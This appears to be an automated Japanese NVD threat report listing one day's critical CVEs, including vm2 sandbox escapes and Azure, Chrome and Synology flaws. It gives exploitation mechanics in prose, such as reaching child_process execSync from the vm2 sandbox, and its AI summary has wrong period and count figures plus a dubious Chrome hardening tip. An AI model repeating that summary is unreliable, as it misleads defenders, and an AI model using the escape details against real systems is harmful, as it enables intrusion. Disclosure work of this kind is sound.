# NVD 脅威インテリジェンスレポート

- **生成日時**: 2026-09-18 15:00 UTC
- **対象期間**: `2026-09-17T15:00:53.000Z` 〜 `2026-09-18T15:00:35.000Z`
- **重要CVE数**: 210 件（Critical 9.0+: 51 件 / High 7.0〜: 159 件）

---

## AI 分析サマリー

## 1. 全体サマリー  
2026 年上半期に公開された CVE のうち、CVSS スコアが 7.0 以上のものは **30 件以上** に上り、特に **クラウドサービス（Azure・Microsoft Fabric）** と **サードパーティ JavaScript ランタイム（vm2）**、そして **モバイル Chrome** に集中しています。  
- 多くは **認証不要（PR:N）・ネットワーク経由（AV:N）** でリモートから直接エクスプロイト可能な **リモートコード実行（RCE）** や **権限昇格** が共通点です。  
- Azure 系統の脆弱性は「認証バイパス＋特権昇格」の組み合わせが目立ち、クラウド環境全体の攻撃面を広げるリスクがあります。  
- vm2 のサンドボックス脱出は、Node.js アプリケーションで広く利用されているため、サーバーサイド JavaScript の安全性に大きな影響を与えます。  

---

## 2. 特に注目すべき CVE  

| CVE | スコア | 主な影響 | 注目理由 |
|-----|--------|----------|----------|
| **CVE‑2026‑93606** | 10.0 (CVSS:4.0) | vm2 (npm) 3.12.0 以前の `VM` / `NodeVM` でサンドボックス脱出。ホスト側が Promise を返す API を公開すると、ブリッジの reject sanitizer が不正に処理され、任意コード実行が可能になる。 | **Node.js エコシステム全体への波及**。多くの SaaS や CI/CD ツールが vm2 を利用しているため、攻撃者が任意のサーバーコードを実行できる。 |
| **CVE‑2026‑69843** | 10.0 (CVSS:3.1) | Microsoft Fabric の認証バイパスにより、ネットワーク上の未認証攻撃者が権限昇格できる。 | **マイクロソフトの主要コラボレーション基盤** が対象で、企業内部の情報漏洩・改ざんリスクが急増。 |
| **CVE‑2026‑85889** | 10.0 (CVSS:3.1) | Azure AI Foundry のクリティカル機能に認証が欠如。未認証攻撃者がネットワーク経由で特権操作を実行可能。 | **AI/ML プラットフォームは機密データを扱うことが前提**。認証欠如はデータ漏洩だけでなく、モデルの改ざんや不正利用につながる。 |
| **CVE‑2026‑93374** | 9.6 (CVSS:3.1) | Chrome Android 153.0.8010.52 未満で **Use‑After‑Free** が発生し、遠隔からサンドボックス外へコード実行が可能。 | **モバイル Chrome は世界最大のブラウザ**。スマートフォンユーザーだけでなく、WebView を組み込んだ企業アプリにも影響。 |
| **CVE‑2026‑13684** | 9.8 (CVSS:3.1) | Synology DiskStation Manager (DSM) の SCGI 実装に不適切なエンコードがあり、任意ファイルの読み書き・DoS が可能。 | **NAS 製品は企業・個人の重要データ保管先**。ファイル系のリモートコード実行は情報漏洩・ランサムウェア感染に直結。 |

---

## 3. 推奨アクション  

### 3.1 共通的な対策
- **脆弱性情報の定期的なモニタリング**（Microsoft Security Update Guide、Chrome Release Notes、npm advisory など）を導入し、スコア 7.0 以上の CVE が公開されたら **48 時間以内に評価・対応** を実施。  
- **最小権限の原則**を徹底し、外部から呼び出せる API・サービスは必要最小限に絞る。  
- **ネットワーク分離**（VPC、サブネット、ファイアウォール）で、特権サービスへの直接アクセスを遮断。  

### 3.2 個別パッケージ／製品別具体的対策  

| 製品 / パッケージ | 現行バージョン (脆弱) | 推奨バージョン (修正済) | 具体的作業 |
|-------------------|----------------------|------------------------|------------|
| **vm2 (npm)** | ≤ 3.12.0 | **≥ 3.12.1** | `npm install vm2@^3.12.1` もしくは `yarn add vm2@^3.12.1`。導入前に **`DANGEROUS_BUILTINS`** の設定を見直し、`child_process` など危険モジュールの使用を禁止。 |
| **Microsoft Fabric** | すべてのリリース | **2026‑09‑xx 以降のセキュリティパッチ**（Microsoft 365 admin center → 更新プログラム） | 管理コンソールで「Fabric – Security Update」適用後、**外部認証プロバイダー** の設定を再確認し、不要な API エンドポイントを無効化。 |
| **Azure AI Foundry** | 2026‑09‑xx 以前 | **2026‑09‑xx 以降のパッチ**（Azure Portal → Update Management） | **Azure Policy** で「Critical Function Authentication」ポリシーを有効化し、全てのエンドポイントに Azure AD 認証を強制。 |
| **Google Chrome (Android)** | < 153.0.8010.52 | **≥ 153.0.8010.52** | Play Store から自動更新を有効化、もしくは企業モバイル管理（EMM）で **Chrome バージョン 153 以上** を配布。 |
| **Synology DSM** | 7.2.0‑7.3.x (該当リビジョン) | **7.4‑90075 以降**（または同等の最新ビルド） | DSM → Control Panel → Update & Restore → 「Check for Updates」→ 最新ファームウェアを適用。適用後、**SCGI の無効化**（必要なら）または **Web Station のアクセス制御** を再設定。 |

### 3.3 追加の防御策
- **vm2**: サンドボックス外部へ Promise を返す API を提供しない。どうしても必要な場合は **`allowAsync: false`** オプションで非同期ブリッジを無効化。  
- **Azure / Microsoft Fabric**: Azure AD 条件付きアクセスポリシーで **MFA** を必須化し、特権ロールへのアクセスは **Just‑In‑Time (JIT) アクセス** に限定。  
- **Chrome**: **Site Isolation** と **Experimental Web Platform features** を有効にし、メモリ破壊系脆弱性の影響を低減。  
- **Synology**: 外部からの SCGI アクセスを **IP フィルタリング**

---

## 🔴 Critical（CVSS 9.0+）

### CVE-2026-93606

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-693` |
| Published | 2026-09-18T14:19:12.500 |

vm2 (npm) versions 3.12.0 and earlier contain a sandbox escape in `VM` and `NodeVM`. When an embedder exposes a host API that returns a host-realm Promise, the bridge's rejection sanitizer (hostPromiseSanitizeReject / makeSanitizedPromiseCallback / normalizeHostPromiseCallbacks in lib/bridge.js) only wraps `then`/`catch` rejection slots that hold a function, and the sandbox-side `Symbol.species`/`.then` neutralization is installed only on the sandbox intrinsic `Promise.prototype`, so it never applies to a host Promise. Code running inside the sandbox can overwrite `p.constructor[Symbol.species]` on the host Promise and then call `p.then()` with no `onRejected` handler; V8 substitutes its internal Thrower, which re-throws the raw host rejection value into a resolve/reject closure captured by the attacker. This delivers an unsanitized, fully functional bridge proxy of the host object to sandboxed code, bypassing handleException and hostPromiseSanitizeReject. If the rejection value is host-pivotable (for example a host `process` object), this results in arbitrary code execution on the host. Fixed in 3.12.1.

### CVE-2026-93605

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-693` |
| Published | 2026-09-18T14:19:12.340 |

vm2 NodeVM versions before 3.12.1 contain a sandbox escape vulnerability where the DANGEROUS_BUILTINS denylist omits child_process despite blocking other host-spawning modules. Attackers can require child_process and execute arbitrary commands on the host system when NodeVM is configured with builtin:['*'] or explicit child_process allowance.

### CVE-2026-93603

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-94` |
| Published | 2026-09-18T14:19:12.003 |

vm2 through 3.12.0 (fixed in 3.12.1) does not correctly handle a nullish `this` receiver in the apply trap of its bridge (lib/bridge.js): when sandboxed code calls a host-provided non-strict (sloppy-mode) function without a receiver — e.g. `fn()`, a detached method, `fn.call()`, `fn.apply(undefined)`, `Reflect.apply(fn, undefined, [])`, or `fn.bind()()` — the undefined receiver is passed straight through to the host call, and V8 substitutes the host realm's global object for `this`. vm2 then wraps and returns that object to the sandbox, giving sandboxed script a live proxy of the host global. This allows a complete sandbox escape: untrusted script can reach `process` and execute arbitrary code/commands on the host (for example via `process.getBuiltinModule('child_process').execSync`). Exploitation requires that the embedding application expose at least one non-strict host function to the sandbox; strict-mode and ES module host functions are not affected.

### CVE-2026-69843

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-290` |
| Published | 2026-09-18T00:17:24.923 |

Authentication bypass by spoofing in Microsoft Fabric allows an unauthorized attacker to elevate privileges over a network.

### CVE-2026-62874

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L` |
| Weaknesses | `CWE-345` |
| Published | 2026-09-18T00:16:57.930 |

Insufficient verification of data authenticity in Azure Billing allows an unauthorized attacker to elevate privileges over a network.

### CVE-2026-85889

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2026-09-17T23:18:53.217 |

Missing authentication for critical function in Azure AI Foundry allows an unauthorized attacker to elevate privileges over a network.

### CVE-2026-83944

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-284` |
| Published | 2026-09-17T23:18:51.257 |

Improper access control in Azure Logic Apps allows an unauthorized attacker to elevate privileges over a network.

### CVE-2026-70200

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-22;CWE-285` |
| Published | 2026-09-17T23:18:36.113 |

Improper limitation of a pathname to a restricted directory ('path traversal') in Azure Logic Apps allows an unauthorized attacker to elevate privileges over a network.

### CVE-2026-69865

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-639` |
| Published | 2026-09-17T23:18:34.670 |

Authorization bypass through user-controlled key in Microsoft Container Registry allows an unauthorized attacker to elevate privileges over a network.

### CVE-2026-69399

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-441` |
| Published | 2026-09-17T23:18:18.793 |

Azure Arc Elevation of Privilege Vulnerability

### CVE-2026-54734

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-918` |
| Published | 2026-09-17T22:17:03.317 |

Prebid Server Java is the Java version of Prebid Server. Prior to 3.43.0, certain bidder adapters interpolate user-supplied parameters into outbound request URLs without using HttpUtil to validate the resulting domain or path segment. A malicious actor who can supply bid-request parameters can cause the server to send HTTP requests to unintended destinations, potentially reaching internal network services, metadata endpoints, or other sensitive server endpoints with the server's network access. This issue is fixed in version 3.43.0.

### CVE-2026-85878

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-285` |
| Published | 2026-09-18T00:17:47.777 |

Improper authorization in Azure Database for PostgreSQL allows an authorized attacker to elevate privileges over a network.

### CVE-2026-85885

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-77` |
| Published | 2026-09-17T23:18:53.080 |

Improper neutralization of special elements used in a command ('command injection') in M365 Copilot allows an authorized attacker to elevate privileges over a network.

### CVE-2026-13684

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-116` |
| Published | 2026-09-18T09:16:39.237 |

An improper encoding or escaping of output vulnerability in SCGI in Synology DiskStation Manager (DSM) before 7.2.1-69057-12, 7.2.2-72806-9, 7.3.2-86009-4 and 7.4-90075 allows remote attackers to read or write arbitrary files and conduct denial-of-service attacks.

### CVE-2026-13639

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-331` |
| Published | 2026-09-18T09:16:38.757 |

An insufficient entropy vulnerability in login logic in Synology DiskStation Manager (DSM) before 7.2.1-69057-12, 7.2.2-72806-9, 7.3.2-86009-4 and 7.4-90075 allows remote attackers to read or write arbitrary files and conduct denial-of-service attacks.

### CVE-2026-67100

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89;CWE-200` |
| Published | 2026-09-18T08:17:00.603 |

HCL BigFix Service Management is affected by SQL Injection flaw and a Cross-Tenant Data Exposure flaw vulnerabilities. which could allow an authenticated attacker to inject database commands to extract sensitive system details, as well as manipulate request values to gain unauthorized access to full personal profile data and PII across different organizations.

### CVE-2026-54460

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2026-09-17T21:17:15.557 |

OpenReception's appointment booking software provides an end-to-end encrypted appointment booking platform. Prior to 1.1.1, POST /api/auth/passkeys accepts a request-body userId and attacker-supplied passkey without an authenticated session, does not call WebAuthnService.verifyRegistration, and does not bind enrollment to locals.user.id. An unauthenticated attacker who knows the public tenant ID and the target staff email can use the public booking bootstrap and GET /api/tenants/[id]/appointments/staff-public-keys to obtain candidate userId values. The attacker first causes UserService.addAdditionalPasskey to store a controlled public key for a candidate userId, then attempts login with the target email; the login check compares verificationResult.userId with the email-resolved account and reveals whether the injected credential belongs to that target. Repeating this injection-before-login sequence identifies the matching userId, and the normal login endpoint accepts the attacker's assertion for the stored key and creates a STAFF session. The session can expose tenant data and reveal TENANT_ADMIN identifiers for further takeover; GLOBAL_ADMIN accounts are not reachable through this tenant-scoped path. A hijacked TENANT_ADMIN can modify or delete tenant resources and key shares, potentially making appointment data permanently undecryptable and taking booking services offline. This issue is fixed in version 1.1.1.

### CVE-2026-45140

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-22;CWE-94;CWE-219;CWE-434` |
| Published | 2026-09-17T21:17:12.440 |

Chamilo LMS is an open-source learning management system. Prior to 2.0.1, Chamilo LMS allows an unauthenticated remote attacker to execute arbitrary code on the server. The authoritative advisory does not identify the affected endpoint, component, input, or exploitation mechanism. This issue is fixed in version 2.0.1.

### CVE-2026-54627

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-122;CWE-787` |
| Published | 2026-09-17T20:16:52.117 |

SAIL is a cross-platform library for loading and saving images with support for animation, metadata, and ICC profiles. In 0.9.10 and earlier, psd_private_sail_pixel_format() in src/sail-codecs/psd/helpers.c resolves a one-channel PSD in Bitmap color mode to SAIL_PIXEL_FORMAT_BPP1_INDEXED without requiring the file depth to be one, so the pixel buffer uses one-bit rows while sail_codec_load_frame_v8_psd() in src/sail-codecs/psd/psd.c accepts depth == 8 and writes one attacker-controlled byte per pixel. Loading a crafted PSD through sail_load_from_file() or sail_load_from_memory() therefore writes beyond each heap row, causing memory corruption, a reliable crash, or potential code execution. This mode/depth mismatch is distinct from GHSA-rcqx-gc76-r9mv and GHSA-wcj8-hxxf-pq2c. This issue is fixed in version 1.0.0.

### CVE-2026-54626

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-122;CWE-787` |
| Published | 2026-09-17T20:16:51.970 |

SAIL is a cross-platform library for loading and saving images with support for animation, metadata, and ICC profiles. In 0.9.10 and earlier, the TGA_INDEXED_RLE path selected by image_type == 9 allocates an image buffer using the one-byte-per-pixel SAIL_PIXEL_FORMAT_BPP8_INDEXED format returned by tga_private_sail_pixel_format() in src/sail-codecs/tga/helpers.c, while sail_codec_load_frame_v8_tga() in src/sail-codecs/tga/tga.c derives a two-to-four-byte pixel_size from an attacker-controlled header bpp value from 9 through 32. Loading a crafted color-mapped run-length-encoded TGA through sail_load_from_file() or sail_load_from_memory() therefore writes attacker-controlled bytes beyond the heap pixel buffer. The pixel-count clamp added for CVE-2026-40494 does not constrain the per-pixel write width, so this issue is an incomplete fix of that vulnerability and can cause heap corruption, a reliable crash, or potential code execution. This issue is fixed in version 1.0.0.

### CVE-2026-54617

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-22;CWE-200;CWE-522` |
| Published | 2026-09-17T19:16:51.003 |

GravitLauncher is an open-source Minecraft launcher based on sashok724's v3. Prior to 5.7.12, an unauthenticated remote actor can send a raw HTTP request target without a leading slash to the default LaunchServer file server on port 9274. FileServerHandler.channelRead0 in components/launchserver/src/main/java/pro/gravit/launchserver/socket/handlers/fileserver/FileServerHandler.java strips the first request-target character and resolves the remaining path against updatesDir without re-normalizing and verifying containment. This leaves parent-directory components in a no-leading-slash request and allows reading any file accessible to the LaunchServer process, including .keys/ecdsa_id, .keys/legacySalt, and LaunchServer.json. Disclosure of those files can expose signing keys, refresh-token material, and database credentials, enabling forged administrative access tokens and full authentication bypass. A normalizing L7 proxy may block the primary request form, but direct exposure and L4/TCP proxies remain affected, and netty.fileServerEnabled is enabled by default. This issue is fixed in 5.7.12.

### CVE-2026-87701

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-74` |
| Published | 2026-09-17T23:18:53.623 |

Improper neutralization of special elements in output used by a downstream component ('injection') in Azure Cosmos DB allows an authorized attacker to elevate privileges over a network.

### CVE-2026-93374

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-416` |
| Published | 2026-09-17T21:17:54.420 |

Use after free in Dawn in Google Chrome on on Android prior to 153.0.8010.52 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Critical)

### CVE-2026-93373

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-416` |
| Published | 2026-09-17T21:17:54.290 |

Use after free in Extensions in Google Chrome prior to 153.0.8010.52 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted Chrome extension. (Chromium security severity: High)

### CVE-2026-93372

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-121` |
| Published | 2026-09-17T21:17:54.180 |

Buffer overflow in WebGL in Google Chrome on on Android prior to 153.0.8010.52 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Critical)

### CVE-2026-54752

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-502;CWE-829` |
| Published | 2026-09-17T20:16:52.877 |

NetBox Device Type Library is a collection of community-sourced device type definitions for import into NetBox. The validation test harness can deserialize pull-request-controlled tracked pickle cache files through pickle.load in the read_pickle_data function in tests/pickle_operations.py. An unauthenticated contributor can change USE_LOCAL_KNOWN_SLUGS in tests/test_configuration.py and supply a crafted tests/known-modules.pickle or tests/known-racks.pickle file that tests/definitions_test.py loads when pytest runs. Deserialization invokes attacker-controlled object reduction behavior, allowing arbitrary code execution in the GitHub Actions runner or in a maintainer process that runs the tests, with the confidentiality, integrity, and availability of reachable resources at risk. This vulnerability is fixed with commit 1c6f7e2b93589b965318c6e67ac3504831f0e71e.

### CVE-2026-54053

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-22` |
| Published | 2026-09-17T18:16:45.857 |

Many Notes is a Markdown note-taking web application designed for simplicity. Prior to 0.16.0, the ZIP vault import implemented in app/Actions/ProcessImportedVault.php accepts archive filenames containing parent-directory traversal segments. An authenticated user can write arbitrary files outside the importing user's vault and into other users' vaults, including overwriting existing files. Disguised SVG content can be placed in another user's vault and execute stored cross-site scripting when the victim opens that vault. This issue is fixed in version 0.16.0.

### CVE-2026-28198

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-347` |
| Published | 2026-09-18T12:17:24.717 |

An authenticated, low-privileged user with access to the NetBackup Flex 
OS management shell could bypass the cryptographic signature 
verification step of a privileged support command by supplying a 
specially formed access credential. Successful exploitation grants the 
attacker an unrestricted root shell with full control over the Flex 
appliance host and all hosted containers, completely compromising 
confidentiality, integrity, and availability.

### CVE-2026-28197

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-88` |
| Published | 2026-09-18T12:17:24.573 |

An authenticated, low-privileged user with access to the NetBackup Flex 
OS management shell could supply a specially crafted input to a 
privileged administrative command, causing it to execute arbitrary code 
with root-level permissions. Successful exploitation grants the attacker
 unrestricted control over the Flex appliance host and all hosted 
containers, fully compromising confidentiality, integrity, and 
availability.

### CVE-2026-54501

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-20;CWE-77;CWE-78;CWE-88;CWE-250` |
| Published | 2026-09-17T21:17:15.707 |

Browsertrix is a high-fidelity, browser-based crawling service for web archiving that can be self-hosted or used through Webrecorder's hosted instance. From 1.15.0 until 1.22.8, Browsertrix improperly sanitizes Git URLs specified as Custom Behaviors, allowing command injection through /api/orgs/*/crawlconfigs/validate/custom-behavior. A user with crawler or administrator permission on the specific instance can supply a crafted Git URL that executes arbitrary operating-system commands in the backend pod. Open registration or hosted free-trial access can make the required role broadly obtainable. Successful exploitation can expose, modify, or delete application database records, archived items, browser profiles, storage data, proxy credentials, and other configured service data. This issue is fixed in version 1.22.8.

### CVE-2026-54618

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L` |
| Weaknesses | `CWE-306;CWE-522;CWE-601` |
| Published | 2026-09-17T20:16:51.823 |

Obsidian Web MCP is a secure remote MCP server for Obsidian vaults. Prior to 0.2.0, /oauth/authorize issues an authorization code without a login, consent, or session check, and /oauth/token can exchange that code for the static VAULT_MCP_TOKEN without authenticating a client. An unauthenticated remote caller who can reach the intended tunnel deployment can therefore call /mcp and use vault_read, vault_write, vault_search, vault_list, vault_move, and vault_delete against the entire vault. Optional PKCE does not prevent an attacker-initiated flow, and unauthenticated /oauth/register also exposes a client_credentials path by returning the configured VAULT_OAUTH_CLIENT_SECRET. This issue is fixed in version 0.2.0.

### CVE-2026-67101

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-918` |
| Published | 2026-09-18T08:17:00.740 |

HCL BigFix Service Management is affected by a Server-Side Request Forgery (SSRF) vulnerability in its search functionality, which could allow an attacker to force the application server to send requests to internal systems that are not accessible from the internet.

### CVE-2026-93467

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-502` |
| Published | 2026-09-18T03:16:33.753 |

The OAKlouds developed by HGiga has a Insecure Deserialization vulnerability. Unauthenticated remote attackers can execute arbitrary code on the server by sending maliciously crafted serialized content.

### CVE-2026-70009

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N` |
| Weaknesses | `CWE-22` |
| Published | 2026-09-17T23:18:35.560 |

Improper limitation of a pathname to a restricted directory ('path traversal') in Azure Arc allows an unauthorized attacker to elevate privileges over a network.

### CVE-2026-54237

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-94;CWE-862` |
| Published | 2026-09-17T21:17:14.980 |

Wavelog is web-based amateur radio logging software. From 1.8 until 2.4.2, Wavelog exposes /install/ajax.php and /install/includes/interface_assets/triggers.php after installation without an installation lock or permission check. Unsanitized input reaches write_config() and write_configfile() in install/includes/core/core_class.php, allowing a remote unauthenticated attacker to read or write log files and place attacker-controlled content into PHP configuration files. The resulting PHP configuration content can execute on the server. This issue is fixed in version 2.4.2.

### CVE-2026-86863

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-290;CWE-807` |
| Published | 2026-09-17T16:18:17.863 |

pgAdmin 4's Webserver authentication source is intended to accept an identity asserted by the web server or reverse proxy in front of pgAdmin, delivered through the WSGI/CGI environment. WebserverAuthentication.get_user() read config.WEBSERVER_REMOTE_USER from request.environ and, when that returned nothing, fell back to reading the same name directly from the inbound HTTP request headers via request.headers.get(). An inbound HTTP header is written by whoever sends the request, so any client able to reach pgAdmin could supply that header itself and be authenticated as any username it named, including an existing Administrator, without presenting a password or any other credential. The environment lookup could also be satisfied by a client-supplied header whenever WEBSERVER_REMOTE_USER was configured to an HTTP_-prefixed or hyphenated name such as HTTP_X_FORWARDED_USER or X-Forwarded-User, since WSGI servers place inbound headers into the environment under exactly those names. Deployments are affected only when 'webserver' is enabled in AUTHENTICATION_SOURCES.

The fix distinguishes a genuine CGI/WSGI variable from a header-derived one and implicitly trusts only the former. A header-asserted identity is now accepted only when the operator explicitly opts in via WEBSERVER_REMOTE_USER_FROM_HEADER, the request arrives from a peer listed in WEBSERVER_TRUSTED_PROXIES, and, when configured, a shared secret supplied in WEBSERVER_SHARED_SECRET_HEADER matches WEBSERVER_SHARED_SECRET under a constant-time comparison. The trusted-peer check deliberately reads the real socket peer address rather than request.remote_addr, because ProxyFix rewrites the latter from the client-controlled X-Forwarded-For header and would otherwise allow an attacker to claim to be the trusted proxy. As defence in depth, login() now refuses any account whose auth_source is not 'webserver', so a misconfigured trust gate cannot be used to assume an internal or LDAP account.

This issue affects pgAdmin 4: from 6.2 before 9.18.

### CVE-2023-5778

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
